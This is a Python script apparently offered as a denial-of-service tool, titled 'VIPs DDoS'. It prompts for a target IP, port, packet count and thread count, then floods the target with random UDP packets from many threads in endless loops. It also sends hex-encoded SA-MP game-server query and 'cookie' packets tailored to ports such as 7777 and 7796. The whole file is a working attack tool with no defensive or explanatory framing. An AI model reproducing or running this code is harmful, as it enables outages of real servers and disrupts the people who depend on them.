# credit edresson remake by bimzzx
import socket
import struct
import codecs,sys
import threading
import random
import time
import os
############################################################################

ezz = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                       ]

############################################################################
banner = """
\033[1;36;40m
\u001b[31m
═══════════════════════════════════════════════
╔══╗
║╔╗║
║╚╝╚╦╦╗╔╦═══╦═══╦╗╔╗
║╔═╗╠╣╚╝╠══║╠══║╠╬╬╝
║╚═╝║║║║║║══╣║══╬╬╬╗
╚═══╩╩╩╩╩═══╩═══╩╝╚╝
═══════════════════════════════════════════════
# Bimzzx With VIPs TEAM   ═══>   Subscribe YouTube Bimzz
╔══════════════════════════════════════════════"""
os.system('cls' if os.name=='nt' else 'clear')
print(banner)
ip = str(input("╠═══[ Masukkan IP-nya ] •\n╠══> "))
port = int(input("╠═══[ Masukkan PORT-nya ] •\n╠══> "))
times = int(input("╠═══[ Masukkan PACKETs-nya ] •\n╠══> "))
size = int(input("╠═══[ Masukkan THREADs-nya ] •\n╠══> "))
os.system('cls' if os.name == 'nt' else 'clear')
print('═══════════════════════════════════════════════')
print('════════════════ • VIPs DDoS • ════════════════')
print('═══════════════════════════════════════════════')
print('[!] THE VIP ATTACKING ══> {}:{}'.format(ip, port))
############################################################################

def x():
        data = random._urandom(666)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                except:
                        s.close()

def xx():
        data = random._urandom(999)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                except:
                        s.close()

class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                pack = random._urandom(818)
                msg = ezz[random.randrange(0,3)]
                sock.sendto(msg, (ip, int(port)))
                sock.sendto(pack, (ip, int(port)))
                if(int(port) == 7777):
                    sock.sendto(ezz[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(ezz[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(ezz[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(ezz[7], (ip, int(port)))
                elif(int(port) == 1111):
                    sock.sendto(ezz[9], (ip, int(port)))    

for b in range(size):
        run = threading.Thread(target = x)
        run.start()

for z in range(size):
        fuck = threading.Thread(target = xx)
        fuck.start()

for f in range(size):
        mythread = MyThread()
        mythread.start()